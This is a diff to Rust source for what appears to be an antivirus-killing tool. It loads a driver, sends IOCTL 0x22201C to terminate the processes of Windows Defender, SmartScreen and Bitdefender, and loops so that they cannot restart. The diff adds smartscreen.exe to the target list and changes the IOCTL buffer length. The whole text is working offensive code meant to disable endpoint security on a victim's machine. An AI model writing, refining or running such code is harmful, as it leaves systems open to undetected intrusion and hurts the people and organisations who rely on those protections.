@@ -33,6 +33,7 @@ const PROCESSES: &[&str] = &[
     "WindowsDefender.exe",
     "WdNisSvc.exe",
     "WinDefend.exe",
+    "smartscreen.exe",
     
     // Bitdefender
     "vsserv.exe",
@@ -203,7 +204,7 @@ impl Driver {
                 self.hDriver,
                 0x22201C,
                 buffer.as_mut_ptr() as LPVOID, 
-                1036,
+                buffer.len(),
                 ptr::null_mut(),        
                 0,
                 &mut bytes_returned,
@@ -244,14 +245,11 @@ fn main() -> Result<()> {
     let hDriver = Driver::Initialize()?;
     println!("[+] Driver ready for operation, Handle: {:p}", &hDriver);
     println!("[*] Scanning for target processes...");
-    let mut found_processes: Vec<(&str, u32)> = Vec::new();
     
     // Loop to prevent processes for restarting
-
     loop {
         for p in PROCESSES {
             if let Ok(pid) = pid_by_name(p) {
-                found_processes.push((p, pid));
                 println!("  -- Found {} - PID: {}", p, pid, );
                 println!("[*] Killing {} ...", p);
                 let result = hDriver.ExecuteIOCTL(pid)?;
